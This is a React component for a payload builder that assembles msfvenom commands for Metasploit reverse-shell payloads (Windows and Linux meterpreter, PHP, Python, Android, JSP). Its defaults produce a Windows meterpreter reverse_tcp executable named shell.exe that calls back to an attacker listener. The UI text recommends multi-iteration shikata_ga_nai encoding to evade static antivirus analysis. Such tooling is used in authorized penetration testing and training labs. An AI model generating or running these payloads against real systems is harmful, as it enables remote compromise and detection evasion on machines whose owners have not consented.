import React, { useState, useEffect } from 'react';
import { CodeBlock } from '../../components/CodeBlock';
import { Shield, Download, Hash } from 'lucide-react';


export const MSFVenomBuilder: React.FC = () => {
  const [config, setConfig] = useState({
    payload: 'windows/x64/meterpreter/reverse_tcp',
    lhost: '10.10.14.2',
    lport: '4444',
    format: 'exe',
    encoder: '',
    iterations: '',
    badchars: '',
    platform: 'windows',
    arch: 'x64',
    outfile: 'shell.exe'
  });

  const [command, setCommand] = useState('');

  const payloads = [
    'windows/x64/meterpreter/reverse_tcp',
    'windows/shell_reverse_tcp',
    'linux/x64/meterpreter/reverse_tcp',
    'linux/x86/shell_reverse_tcp',
    'php/meterpreter/reverse_tcp',
    'python/meterpreter/reverse_tcp',
    'android/meterpreter/reverse_tcp',
    'java/jsp_shell_reverse_tcp'
  ];

  const formats = ['exe', 'elf', 'python', 'raw', 'war', 'jsp', 'c', 'dll'];
  const encoders = ['', 'x86/shikata_ga_nai', 'x64/xor', 'cmd/powershell_base64'];

  useEffect(() => {
    let cmd = `msfvenom -p ${config.payload}`;
    if (config.lhost) cmd += ` LHOST=${config.lhost}`;
    if (config.lport) cmd += ` LPORT=${config.lport}`;
    if (config.platform) cmd += ` --platform ${config.platform}`;
    if (config.arch) cmd += ` -a ${config.arch}`;
    if (config.badchars) cmd += ` -b "${config.badchars}"`;
    if (config.encoder) cmd += ` -e ${config.encoder}`;
    if (config.iterations) cmd += ` -i ${config.iterations}`;
    if (config.format) cmd += ` -f ${config.format}`;
    if (config.outfile) cmd += ` -o ${config.outfile}`;
    setCommand(cmd);
  }, [config]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setConfig({ ...config, [e.target.name]: e.target.value });
  };

  return (
    <div className="space-y-8">
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        <div className="lg:col-span-1 space-y-6">
          <div className="p-6 bg-white/[0.02] border border-white/5 rounded-2xl space-y-5">
            <div className="space-y-2">
              <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">Metasploit Payload</label>
              <select name="payload" value={config.payload} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all appearance-none">
                {payloads.map(p => <option key={p} value={p}>{p}</option>)}
              </select>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">LHOST</label>
                <input name="lhost" value={config.lhost} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all" />
              </div>
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">LPORT</label>
                <input name="lport" value={config.lport} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all" />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">Format</label>
                <select name="format" value={config.format} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all appearance-none cursor-pointer">
                  {formats.map(f => <option key={f} value={f}>{f.toUpperCase()}</option>)}
                </select>
              </div>
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">Output Name</label>
                <input name="outfile" value={config.outfile} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all" />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">Encoder</label>
                <select name="encoder" value={config.encoder} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all appearance-none cursor-pointer">
                  <option value="">None</option>
                  {encoders.slice(1).map(e => <option key={e} value={e}>{e}</option>)}
                </select>
              </div>
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">Iterations</label>
                <input name="iterations" type="number" value={config.iterations} onChange={handleChange} className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all" placeholder="e.g. 3" />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em]">Bad Characters (Global)</label>
              <input name="badchars" value={config.badchars} onChange={handleChange} placeholder="e.g. \x00\x0a" className="w-full bg-[#0a0f16]/60 border border-white/10 rounded-lg p-3 text-[13px] text-white/80 focus:ring-1 focus:ring-[#9fef00]/40 outline-none transition-all" />
            </div>
          </div>
        </div>

        <div className="lg:col-span-2 space-y-6">
          <div className="p-0.5 rounded-2xl bg-gradient-to-br from-[#9fef00]/10 via-transparent to-transparent">
            <div className="p-8 bg-[#0a0f16]/80 rounded-2xl border border-white/5 shadow-2xl">
              <h3 className="text-xs font-bold text-white mb-5 uppercase tracking-[0.2em] flex items-center gap-2.5">
                <Download className="w-4 h-4 text-[#9fef00]" /> Assembly Manifest
              </h3>
              <CodeBlock code={command} title="MSFVENOM CLI PARAMETERS" />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            <div className="p-6 bg-white/[0.01] border border-white/5 rounded-2xl space-y-2.5 group hover:border-white/10 transition-colors">
              <Shield className="w-5 h-5 text-white/20 group-hover:text-white/40 transition-colors" />
              <h4 className="font-bold text-white text-[13px] tracking-tight uppercase">Bypass Strategies</h4>
              <p className="text-[11px] text-white/40 leading-relaxed font-medium">
                Implement <code>shikata_ga_nai</code> encoding with multiple iterations (<code>-i 5+</code>) to obscure binary signatures from static analysis engines.
              </p>
            </div>
            <div className="p-6 bg-white/[0.01] border border-white/5 rounded-2xl space-y-2.5 group hover:border-white/10 transition-colors">
              <Hash className="w-5 h-5 text-white/20 group-hover:text-white/40 transition-colors" />
              <h4 className="font-bold text-white text-[13px] tracking-tight uppercase">Staging Methodology</h4>
              <p className="text-[11px] text-white/40 leading-relaxed font-medium">
                Select appropriate formats (e.g. <code>war</code> for Tomcat, <code>elf</code> for Linux). Staged payloads connect back to a listener to download the full shell.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};